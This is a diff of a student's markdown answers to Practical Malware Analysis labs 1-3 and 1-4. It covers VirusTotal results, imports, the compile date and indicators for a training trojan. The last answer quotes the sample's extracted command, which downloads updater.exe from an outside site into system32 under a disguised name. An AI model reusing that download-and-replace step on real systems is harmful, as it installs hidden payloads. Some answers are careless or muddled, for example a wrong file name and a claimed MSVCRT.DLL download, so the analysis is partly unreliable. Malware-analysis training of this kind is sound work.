@@ -83,7 +83,7 @@ using this info we can use it as a network-based indicator to identify this malw
 
 ---
 
-# Lab 1-3
+# Lab 1.3
 Analyze the file Lab01-03.exe.
 
 ### 1. Upload the Lab01-03.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?
@@ -107,3 +107,44 @@ LoadLibraryA
 ### 4. What host- or network-based indicators could be used to identify this malware on infected machines?
 
 Analyzing the malware we are unable to find any indicator .
+
+
+---
+
+# Lab 1.4
+
+Analyze the file Lab01-04.exe.
+
+### 1. Upload the Lab01-04.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?
+
+Yes uploading the Lab01-03.exe to virustotal we can ensure that it exist in antivirus definitions. Exists as `trojan.cerbu/gofot`
+
+
+### 2. Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.
+
+Using `PEID` We can identify that it is not obfuscated and compiled using `Microsoft Visual C++ 6.0`. 
+
+
+### 3. When was this program compiled?
+
+The program was compiled on `Friday, 30.08.2019 22:26:59 UTC`
+
+### 4. Do any imports hint at this program’s functionality? If so, which imports are they and what do they tell you?
+
+The import in program are:
+- KERNEL32.DLL
+- ADVAPI32.dll
+- MSVCRT.dll
+
+This program to get view process & upgrade the previledge for a user , load library & write into a file.
+
+
+### 5. What host- or network-based indicators could be used to identify this malware on infected machines?
+
+This malware can upgrade priviledge and download a file from a website. Thus ensuring as idicator to identify that malware is on infected file.
+
+
+### 6. This file has one resource in the resource section. Use Resource Hacker to examine that resource, and then use it to extract the resource. What can you learn from the resource?
+
+We learn that it download MSVCRT.DLL into our devices. and runs this command to download a .exe file into system.
+`\winup.exe $sis \system32\wupdmgrd.exe $sts http://www.practicalmalwareanalysis.com/updater.exe` 
